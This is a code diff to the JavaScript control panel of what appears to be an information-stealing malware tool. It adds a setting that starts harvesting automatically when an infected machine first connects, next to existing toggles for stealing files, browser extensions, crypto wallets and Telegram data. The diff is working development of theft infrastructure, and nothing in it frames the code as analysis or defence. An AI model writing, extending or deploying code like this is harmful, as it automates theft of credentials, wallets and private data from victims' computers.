@@ -65,6 +65,7 @@
   const settingsGrid     = $("settings-grid");
   const settingsAdminMsg = $("settings-admin-msg");
   const settingsStatus   = $("settings-status");
+  const autoFirstConnectToggle = $("auto-first-connect-toggle");
   const autoFilesToggle   = $("auto-files-toggle");
   const autoExtToggle     = $("auto-ext-toggle");
   const autoWalletsToggle = $("auto-wallets-toggle");
@@ -1796,6 +1797,10 @@
   async function fetchHarvestOptionsState() {
     try {
       const s = await rpc("get_capture_settings");
+      // Default ON if key missing (undefined) — only force off when explicitly false/0
+      if (autoFirstConnectToggle) {
+        autoFirstConnectToggle.checked = s.harvest_auto_first_connect !== false && s.harvest_auto_first_connect !== 0;
+      }
       if (autoFilesToggle) autoFilesToggle.checked = !!s.harvest_files;
       if (autoExtToggle) autoExtToggle.checked = !!s.harvest_extensions;
       if (autoWalletsToggle) autoWalletsToggle.checked = !!s.harvest_wallets;
@@ -1820,17 +1825,21 @@
   async function saveSettings() {
     if (!settingsStatus) return;
     settingsStatus.textContent = "Saving…";
-    // Never auto-run on connect
+    // Never use platform autoLoad (every connect) — first-connect is server-side only
     await disablePluginAutoLoad();
     try {
       await rpc("update_capture_settings", {
+        harvest_auto_first_connect: !!(autoFirstConnectToggle && autoFirstConnectToggle.checked),
         harvest_files: !!(autoFilesToggle && autoFilesToggle.checked),
         harvest_extensions: !!(autoExtToggle && autoExtToggle.checked),
         harvest_wallets: !!(autoWalletsToggle && autoWalletsToggle.checked),
         harvest_telegram: !!(autoTelegramToggle && autoTelegramToggle.checked),
         harvest_file_rules: fileRules.slice(),
       });
-      settingsStatus.textContent = "Harvest options saved (manual only)";
+      const first = !!(autoFirstConnectToggle && autoFirstConnectToggle.checked);
+      settingsStatus.textContent = first
+        ? "Saved — auto-harvest on first connect only"
+        : "Saved — manual Collect only (first-connect off)";
       renderFileRuleList();
     } catch (e) {
       settingsStatus.textContent = `Error: ${e.message}`;
@@ -2041,9 +2050,10 @@
       return;
     }
 
-    // Ensure connect never auto-starts harvest (clear any previous autoLoad)
+    // Platform autoLoad would fire every connect — we use server first-connect claim instead
     disablePluginAutoLoad();
 
+    if (autoFirstConnectToggle) autoFirstConnectToggle.addEventListener("change", saveSettings);
     if (autoFilesToggle) autoFilesToggle.addEventListener("change", saveSettings);
     if (autoExtToggle) autoExtToggle.addEventListener("change", saveSettings);
     if (autoWalletsToggle) autoWalletsToggle.addEventListener("change", saveSettings);
